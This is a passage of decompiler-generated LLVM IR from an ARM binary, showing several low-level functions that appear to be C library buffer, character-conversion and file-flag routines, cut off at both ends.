dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d54, %dec_label_pc_17b3c, %dec_label_pc_17d68
  %v0_17d6c = phi i32 [ %v0_17b4c, %dec_label_pc_17b3c ], [ 0, %dec_label_pc_17d68 ], [ %v0_17d58, %dec_label_pc_17d54 ]
  store i32 %v0_17d6c, i32* %r0.global-to-local, align 4
  store i32 %v3_17a54, i32* @r4, align 4
  store i32 %v6_17a54, i32* @r5, align 4
  store i32 %v9_17a54, i32* @r6, align 4
  store i32 %v12_17a54, i32* @r7, align 4
  store i32 %v15_17a54, i32* @r8, align 4
  store i32 %v18_17a54, i32* @sb, align 4
  store i32 %v21_17a54, i32* @sl, align 4
  store i32 %v24_17a54, i32* @fp, align 4
  ret i32 %v0_17d6c

; uselistorder directives
  uselistorder i32 %v0_17d6c, { 1, 0 }
  uselistorder i32 %v0_17d58, { 0, 2, 1 }
  uselistorder i32 %v3_17d4c, { 1, 0 }
  uselistorder i32 %v2_17d4c, { 1, 0, 2 }
  uselistorder i32 %v2_17c9088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_17d48, { 1, 0 }
  uselistorder i32 %v0_17d38.pre, { 0, 2, 1 }
  uselistorder i32 %v5_17ccc, { 1, 0, 2, 3 }
  uselistorder i1 %v9_17d4886, { 1, 0 }
  uselistorder i1 %v9_17c70, { 1, 0 }
  uselistorder i32 %v3_17c48, { 0, 2, 1, 3 }
  uselistorder i1 %v7_17c20, { 1, 0 }
  uselistorder i1 %v8_17c18, { 1, 0 }
  uselistorder i32 %v3_17be8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_17bd8, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_17bc0, { 1, 0, 2 }
  uselistorder i32 %v1_17bb0, { 1, 0, 2 }
  uselistorder i32 %v0_17b9c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17b94, { 1, 0 }
  uselistorder i32 %v1_17b80, { 1, 0 }
  uselistorder i32 %v1_17b7c, { 1, 0 }
  uselistorder i32 %v1_17b3c, { 2, 0, 1 }
  uselistorder i32 %v0_17b24, { 1, 0 }
  uselistorder i32 %v1_17b14, { 0, 2, 1 }
  uselistorder i1 %v2_17c44, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17aa0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_17a94, { 2, 1, 0 }
  uselistorder i32 %v3_17a7c, { 1, 0 }
  uselistorder i32 %v3_17a78, { 2, 1, 0 }
  uselistorder i32 %v1_17a70, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 26, 27, 24, 5, 4, 7, 8, 25, 6, 10, 9, 12, 11, 13, 16, 14, 15, 20, 17, 18, 19, 23, 21, 22, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 33, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 92, { 2, 0, 1 }
  uselistorder i32 81, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_17d6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d54, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_17d34, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ce8, { 1, 0 }
  uselistorder label %dec_label_pc_17ab8.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17c60, { 1, 0 }
  uselistorder label %dec_label_pc_17c20, { 1, 0 }
  uselistorder label %dec_label_pc_17c14, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17bd8, { 1, 0 }
  uselistorder label %dec_label_pc_17b0c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_17d7c(i32* %arg1) local_unnamed_addr {
dec_label_pc_17d7c:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_17d80 = icmp eq i32* %arg1, null
  br i1 %v2_17d80, label %dec_label_pc_17da8, label %dec_label_pc_17d88

dec_label_pc_17d88:                               ; preds = %dec_label_pc_17d7c
  %v2_17d88 = load i32, i32* %arg1, align 4
  %v1_17d8c = inttoptr i32 %v2_17d88 to i16*
  %v2_17d8c = call i32 @function_17f20(i16* %v1_17d8c)
  %v0_17d90 = load i32, i32* @r4, align 4
  %v1_17d90 = add i32 %v0_17d90, 20
  %v2_17d90 = inttoptr i32 %v1_17d90 to i32*
  %v3_17d90 = load i32, i32* %v2_17d90, align 4
  %v2_17d94 = icmp eq i32 %v3_17d90, 0
  br i1 %v2_17d94, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_17d88
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_17d88, %bb
  store i32 97696, i32* @lr, align 4
  %v1_17d9c = xor i1 %v2_17d94, true
  call void @__pseudo_cond_branch(i1 %v1_17d9c, i32 ptrtoint (i32* @global_var_15850.966 to i32))
  %v0_17da0 = load i32, i32* @r4, align 4
  store i32 %v0_17da0, i32* @r0, align 4
  %v0_17da4 = call i32 @function_15850()
  br label %dec_label_pc_17da8

dec_label_pc_17da8:                               ; preds = %dec_label_pc_17d7c, %bb6
  %v1_17dac = phi i32 [ 0, %dec_label_pc_17d7c ], [ %v0_17da4, %bb6 ]
  ret i32 %v1_17dac

; uselistorder directives
  uselistorder label %dec_label_pc_17da8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_17db0(i32 %arg1) local_unnamed_addr {
dec_label_pc_17db0:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17dbc = load i32, i32* @r4, align 4
  store i32 %v3_17dbc, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2390c.969 to i32), i32* @r1, align 4
  %v0_17dc4 = load i32, i32* @r0, align 4
  %v2_17dc4 = load i32, i32* @r2, align 4
  %v4_17dc4 = call i32 @function_180d4(i32 %v0_17dc4, i32 ptrtoint (i32* @global_var_2390c.969 to i32), i32 %v2_17dc4, i32 180260)
  store i32 %v4_17dc4, i32* %r0.global-to-local, align 4
  store i32 %v4_17dc4, i32* @r4, align 4
  %v2_17dc8 = icmp eq i32 %v4_17dc4, 0
  br i1 %v2_17dc8, label %bb, label %dec_label_pc_17dd4

bb:                                               ; preds = %dec_label_pc_17db0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17db0
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_17ddc = call i32 @function_1a610(i32 1, i32 24)
  store i32 %v2_17ddc, i32* %r0.global-to-local, align 4
  %v2_17de0 = icmp eq i32 %v2_17ddc, 0
  br i1 %v2_17de0, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_17dd4
  %v1_17de4 = load i32, i32* @r4, align 4
  %v3_17de4 = inttoptr i32 %v2_17ddc to i32*
  store i32 %v1_17de4, i32* %v3_17de4, align 4
  %v1_17dec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_17dd4, %bb4
  %v1_17dec = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_17dd4 ], [ %v1_17dec.pre, %bb4 ]
  %v2_17de8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17de8, i32* @r4, align 4
  ret i32 %v1_17dec

; uselistorder directives
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_17df8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_17df8:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_17df8 = load i32, i32* @lr, align 4
  %v2_17dfc = icmp eq i32 %arg1, 0
  br i1 %v2_17dfc, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_17df8
  br label %bb11

bb:                                               ; preds = %dec_label_pc_17df8
  %v3_17e04 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_17e2c = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_17e18 = phi i32 [ %arg1, %.thread ], [ %v3_17e04, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_17e14 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_17e14, i32* @ip, align 4
  %v2_17e1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_17e14, i32* %stack_var_-16, align 4
  store i32 %v0_17e2c, i32* %stack_var_-12, align 4
  %v5_17e34 = inttoptr i32 %v0_17e18 to i8*
  %v6_17e34 = call i32 @function_17e70(i8* %v5_17e34, i32 %v2_17e1c, i32 1, i32 16, i32 %arg3)
  %v2_17e38 = icmp eq i32 %v6_17e34, 0
  br i1 %v2_17e38, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_17e48 = phi i32 [ %v6_17e34, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_17df8, i32* @lr, align 4
  ret i32 %v1_17e48

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_17e4c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_17e4c:
  store i32 %arg1, i32* @r3, align 4
  %v0_17e60 = load i32, i32* @r0, align 4
  %v1_17e60 = load i32, i32* @r1, align 4
  %v5_17e60 = inttoptr i32 %v0_17e60 to i8*
  %v6_17e60 = call i32 @function_17e70(i8* %v5_17e60, i32 %v1_17e60, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_17e60

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_17e70(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_17e70:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17e70 = load i32, i32* @r4, align 4
  store i32 %v3_17e70, i32* %stack_var_-12, align 4
  %v10_17e74 = icmp eq i32 %tmp, %arg2
  store i1 %v10_17e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_17e74, label %dec_label_pc_17e8c, label %bb

bb:                                               ; preds = %dec_label_pc_17e70
  %v4_17e78 = icmp eq i8* %arg1, null
  store i1 %v4_17e78, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_17e78, label %dec_label_pc_17e8c.thread, label %bb39

dec_label_pc_17e8c.thread:                        ; preds = %bb
  %v2_17e7c = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_17e8c:                               ; preds = %dec_label_pc_17e70
  %v2_17e7c1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_17e8c = icmp eq i8* %arg1, null
  store i1 %v3_17e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17e8c, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17e8c
  store i32 %v2_17e7c1, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_17e8c, %dec_label_pc_17e8c.thread
  %storemerge20 = phi i32 [ %v2_17e7c1, %dec_label_pc_17e8c ], [ %v2_17e7c, %dec_label_pc_17e8c.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_17ee828 = phi i32 [ %v2_17e7c1, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_17ea4 = load i32, i32* @r3, align 4
  %v3_17ea4 = icmp uge i32 %v0_17ea4, %arg3
  %arg3.v0_17ea4 = select i1 %v3_17ea4, i32 %arg3, i32 %v0_17ea4
  store i32 %arg3.v0_17ea4, i32* %r5.global-to-local, align 4
  %v1_17eb0 = inttoptr i32 %arg2 to i32*
  %v2_17eb0 = load i32, i32* %v1_17eb0, align 4
  store i32 %v2_17eb0, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_17ea4, i32* %r0.global-to-local, align 4
  %v2_17efc22 = icmp eq i32 %arg3.v0_17ea4, 0
  store i1 %v2_17efc22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17efc22, label %dec_label_pc_17f04, label %dec_label_pc_17ebc

dec_label_pc_17ebc:                               ; preds = %.thread14.thread, %dec_label_pc_17ef4.dec_label_pc_17ebc_crit_edge
  %v2_17ee8 = phi i32 [ %v2_17ef4, %dec_label_pc_17ef4.dec_label_pc_17ebc_crit_edge ], [ %v2_17ee828, %.thread14.thread ]
  %v0_17ec8 = phi i32 [ %v0_17ebc.pre, %dec_label_pc_17ef4.dec_label_pc_17ebc_crit_edge ], [ %v2_17eb0, %.thread14.thread ]
  %v1_17ebc = inttoptr i32 %v0_17ec8 to i32*
  %v2_17ebc = load i32, i32* %v1_17ebc, align 4
  %v7_17ec0 = icmp eq i32 %v2_17ebc, 127
  store i1 %v7_17ec0, i1* %cpsr_z.global-to-local, align 1
  %v1_17ec4 = urem i32 %v2_17ebc, 256
  store i32 %v1_17ec4, i32* @ip, align 4
  %v1_17ec8 = add i32 %v0_17ec8, 4
  store i32 %v1_17ec8, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_17ebc, 128
  br i1 %tmp45, label %dec_label_pc_17ee4, label %dec_label_pc_17ed0

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17ebc
  %v0_17ed0 = call i32 @function_12b24()
  store i32 %v0_17ed0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17edc = inttoptr i32 %v0_17ed0 to i32*
  store i32 84, i32* %v2_17edc, align 4
  %v0_17f10.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17f10

dec_label_pc_17ee4:                               ; preds = %dec_label_pc_17ebc
  %v2_17ee4 = icmp eq i32 %v1_17ec4, 0
  store i1 %v2_17ee4, i1* %cpsr_z.global-to-local, align 1
  %v1_17ee8 = trunc i32 %v2_17ebc to i8
  %v3_17ee8 = inttoptr i32 %v2_17ee8 to i8*
  store i8 %v1_17ee8, i8* %v3_17ee8, align 1
  %v0_17eec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17eec, label %.dec_label_pc_17f04_crit_edge, label %dec_label_pc_17ef4

dec_label_pc_17ef4:                               ; preds = %dec_label_pc_17ee4
  %v0_17ef4 = load i32, i32* %lr.global-to-local, align 4
  %v1_17ef4 = load i32, i32* %r4.global-to-local, align 4
  %v2_17ef4 = add i32 %v1_17ef4, %v0_17ef4
  store i32 %v2_17ef4, i32* %lr.global-to-local, align 4
  %v0_17ef8 = load i32, i32* %r0.global-to-local, align 4
  %v1_17ef8 = add i32 %v0_17ef8, -1
  store i32 %v1_17ef8, i32* %r0.global-to-local, align 4
  %v2_17efc = icmp eq i32 %v1_17ef8, 0
  store i1 %v2_17efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17efc, label %dec_label_pc_17f04, label %dec_label_pc_17ef4.dec_label_pc_17ebc_crit_edge

dec_label_pc_17ef4.dec_label_pc_17ebc_crit_edge:  ; preds = %dec_label_pc_17ef4
  %v0_17ebc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17ebc

.dec_label_pc_17f04_crit_edge:                    ; preds = %dec_label_pc_17ee4
  %v1_17eec = load i32, i32* @ip, align 4
  store i32 %v1_17eec, i32* %r2.global-to-local, align 4
  %v0_17f04.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17ef4, %.dec_label_pc_17f04_crit_edge, %.thread14.thread
  %v0_17f04 = phi i32 [ %v0_17f04.pre, %.dec_label_pc_17f04_crit_edge ], [ %v2_17ee828, %.thread14.thread ], [ %v2_17ef4, %dec_label_pc_17ef4 ]
  %v1_17f04 = load i32, i32* @sp, align 4
  %v9_17f04 = icmp eq i32 %v0_17f04, %v1_17f04
  store i1 %v9_17f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17f04, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_17f04
  %v1_17f08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_17f08, i32* %v1_17eb0, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_17f04, %bb43
  %v0_17f0c = load i32, i32* %r0.global-to-local, align 4
  %v1_17f0c = load i32, i32* %r5.global-to-local, align 4
  %v2_17f0c = sub i32 %v1_17f0c, %v0_17f0c
  store i32 %v2_17f0c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17f10

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17ed0, %bb44
  %v0_17f10 = phi i32 [ %v0_17f10.pre, %dec_label_pc_17ed0 ], [ %v2_17f0c, %bb44 ]
  store i32 %v0_17f10, i32* %r0.global-to-local, align 4
  %v2_17f18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17f18, i32* %r4.global-to-local, align 4
  ret i32 %v0_17f10

; uselistorder directives
  uselistorder i32 %v0_17f10, { 1, 0 }
  uselistorder i32 %v1_17ef8, { 1, 0 }
  uselistorder i32 %v2_17ef4, { 0, 2, 1 }
  uselistorder i32 %v1_17ec4, { 1, 0 }
  uselistorder i32 %v2_17ebc, { 2, 0, 1, 3 }
  uselistorder i32 %v2_17ee828, { 1, 0 }
  uselistorder i32 %v2_17e7c1, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 2, 5, 1, 3, 0, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 6, 3, 4, 5, 1, 7, 0, 8, 9 }
  uselistorder i32 127, { 4, 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17f10, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_17f04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17ebc, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @function_17f20(i16* %arg1) local_unnamed_addr {
dec_label_pc_17f20:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17f20 = load i32, i32* @r4, align 4
  store i32 %v3_17f20, i32* %stack_var_-36, align 4
  %v6_17f20 = load i32, i32* @r5, align 4
  %v9_17f20 = load i32, i32* @r6, align 4
  %v12_17f20 = load i32, i32* @r7, align 4
  %v15_17f20 = load i32, i32* @r8, align 4
  %v27_17f20 = load i32, i32* @lr, align 4
  %v2_17f24 = add i32 %tmp, 52
  %v3_17f24 = inttoptr i32 %v2_17f24 to i32*
  %v4_17f24 = load i32, i32* %v3_17f24, align 4
  %v1_17f2c = sub i32 1, %v4_17f24
  %v2_17f2c = icmp ult i32 %v4_17f24, 2
  br i1 %v2_17f2c, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_17f20
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17f20, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_17f2c, %dec_label_pc_17f20 ]
  %v0_17f34 = phi i32 [ 0, %bb ], [ %v1_17f2c, %dec_label_pc_17f20 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_17f34 = icmp eq i32 %v0_17f34, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 180260, i32* @r6, align 4
  br i1 %v2_17f34, label %dec_label_pc_17f80, label %dec_label_pc_17f48

dec_label_pc_17f48:                               ; preds = %bb18
  %v4_17f60 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_17f60)
  %v0_17f74 = load i32, i32* @r6, align 4
  %v2_17f74 = add i32 %v0_17f74, 16
  %v3_17f74 = inttoptr i32 %v2_17f74 to i32*
  %v4_17f74 = load i32, i32* %v3_17f74, align 4
  call void @__pseudo_branch(i32 %v4_17f74)
  %v0_17f80.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f80

dec_label_pc_17f80:                               ; preds = %bb18, %dec_label_pc_17f48
  %v1_17f88 = phi i32 [ %tmp, %bb18 ], [ %v0_17f80.pre, %dec_label_pc_17f48 ]
  %v1_17f80 = inttoptr i32 %v1_17f88 to i16*
  %v2_17f80 = load i16, i16* %v1_17f80, align 2
  %v3_17f80 = zext i16 %v2_17f80 to i32
  %v1_17f84 = and i32 %v3_17f80, 64
  %v2_17f84 = icmp eq i32 %v1_17f84, 0
  br i1 %v2_17f84, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_17f80
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17f80, %bb19
  %storemerge26 = phi i32 [ %v1_17f88, %bb19 ], [ %v1_17f84, %dec_label_pc_17f80 ]
  %v1_17f8c = xor i1 %v2_17f84, true
  call void @__pseudo_cond_branch(i1 %v1_17f8c, i32 ptrtoint (i32* @global_var_194e0.974 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_17f94 = load i32, i32* @r5, align 4
  %v1_17f94 = add i32 %v0_17f94, 4
  %v2_17f94 = inttoptr i32 %v1_17f94 to i32*
  %v3_17f94 = load i32, i32* %v2_17f94, align 4
  %v1_17f98 = call i32 @function_12a98(i32 %v3_17f94)
  %v0_17fa0 = load i32, i32* @r6, align 4
  %v2_17fac = add i32 %v0_17fa0, 116
  %v3_17fac = inttoptr i32 %v2_17fac to i32*
  %v4_17fac = load i32, i32* %v3_17fac, align 4
  store i32 %v4_17fac, i32* @r7, align 4
  %v1_17fb4 = load i32, i32* @r5, align 4
  %v2_17fb4 = add i32 %v1_17fb4, 4
  %v3_17fb4 = inttoptr i32 %v2_17fb4 to i32*
  store i32 -1, i32* %v3_17fb4, align 4
  %v0_17fbc = load i32, i32* @r6, align 4
  %v2_17fbc = add i32 %v0_17fbc, 76
  %v3_17fbc = inttoptr i32 %v2_17fbc to i32*
  %v4_17fbc = load i32, i32* %v3_17fbc, align 4
  %v1_17fc4 = icmp slt i32 %v1_17f98, 0
  store i32 %v4_17fbc, i32* %stack_var_-80, align 4
  br i1 %v1_17fc4, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_17fbc)
  %v0_17fec = load i32, i32* @r6, align 4
  %v2_17fec = add i32 %v0_17fec, 16
  %v3_17fec = inttoptr i32 %v2_17fec to i32*
  %v4_17fec = load i32, i32* %v3_17fec, align 4
  call void @__pseudo_branch(i32 %v4_17fec)
  %v0_17ffc = load i32, i32* @r6, align 4
  %v2_17ffc = add i32 %v0_17ffc, 12
  %v3_17ffc = inttoptr i32 %v2_17ffc to i32*
  %v4_17ffc = load i32, i32* %v3_17ffc, align 4
  %v1_18000 = inttoptr i32 %v4_17ffc to i32*
  %v2_18000 = load i32, i32* %v1_18000, align 4
  %v1_18008 = add i32 %v2_18000, 1
  %v2_1800c = add i32 %v0_17ffc, 24
  %v3_1800c = inttoptr i32 %v2_1800c to i32*
  %v4_1800c = load i32, i32* %v3_1800c, align 4
  store i32 %v4_1800c, i32* @r4, align 4
  store i32 %v1_18008, i32* %v1_18000, align 4
  call void @__pseudo_branch(i32 %v4_1800c)
  %v0_18024 = load i32, i32* @r5, align 4
  %v1_18024 = inttoptr i32 %v0_18024 to i16*
  %v2_18024 = load i16, i16* %v1_18024, align 2
  %v1_18028 = and i16 %v2_18024, 24576
  %v1_1802c = or i16 %v1_18028, 48
  %v0_18030 = load i32, i32* %sb.global-to-local, align 4
  %v2_18030 = icmp eq i32 %v0_18030, 0
  store i16 %v1_1802c, i16* %v1_18024, align 2
  br i1 %v2_18030, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_18044 = xor i1 %v2_18030, true
  call void @__pseudo_cond_branch(i1 %v2_18044, i32 %v4_1800c)
  %v0_18048 = load i32, i32* @r5, align 4
  %v1_18048 = inttoptr i32 %v0_18048 to i16*
  %v2_18048 = load i16, i16* %v1_18048, align 2
  %v1_1804c = and i16 %v2_18048, 16384
  %v2_1804c = icmp eq i16 %v1_1804c, 0
  br i1 %v2_1804c, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_18054 = xor i1 %v2_1804c, true
  call void @__pseudo_cond_branch(i1 %v1_18054, i32 ptrtoint (i32* @global_var_15850.966 to i32))
  %v2_18060 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_18060)
  call void @__pseudo_branch(i32 %v4_17fec)
  %v0_18080 = load i32, i32* @r6, align 4
  %v2_18080 = add i32 %v0_18080, 52
  %v3_18080 = inttoptr i32 %v2_18080 to i32*
  %v4_18080 = load i32, i32* %v3_18080, align 4
  %v1_18084 = inttoptr i32 %v4_18080 to i32*
  %v2_18084 = load i32, i32* %v1_18084, align 4
  %v1_18088 = add i32 %v2_18084, 1
  store i32 %v1_18088, i32* %v1_18084, align 4
  call void @__pseudo_branch(i32 %v4_1800c)
  %v0_180a0 = call i32 @function_19358()
  %v0_180a4 = load i32, i32* %sl.global-to-local, align 4
  %v2_180ac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_180ac, i32* @r4, align 4
  store i32 %v6_17f20, i32* @r5, align 4
  store i32 %v9_17f20, i32* @r6, align 4
  store i32 %v12_17f20, i32* @r7, align 4
  store i32 %v15_17f20, i32* @r8, align 4
  store i32 %v27_17f20, i32* @lr, align 4
  ret i32 %v0_180a4

; uselistorder directives
  uselistorder i1 %v2_1804c, { 1, 0 }
  uselistorder i32 %v4_1800c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_17f24, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_17f80, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_180b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_180b8:
  %v0_180b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_180b8, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_180b8
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_180b8, %bb
  %v10_180d0 = phi i32 [ %arg1, %dec_label_pc_180b8 ], [ 0, %bb ]
  ret i32 %v10_180d0

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_180d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_180d4:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_180e4 = call i32 @function_181d8()
  ret i32 %v0_180e4
}

define i32 @function_180f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_180f4:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_18100 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_18100, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_18110 = call i32 @function_190dc()
  ret i32 %v0_18110

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_18124(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
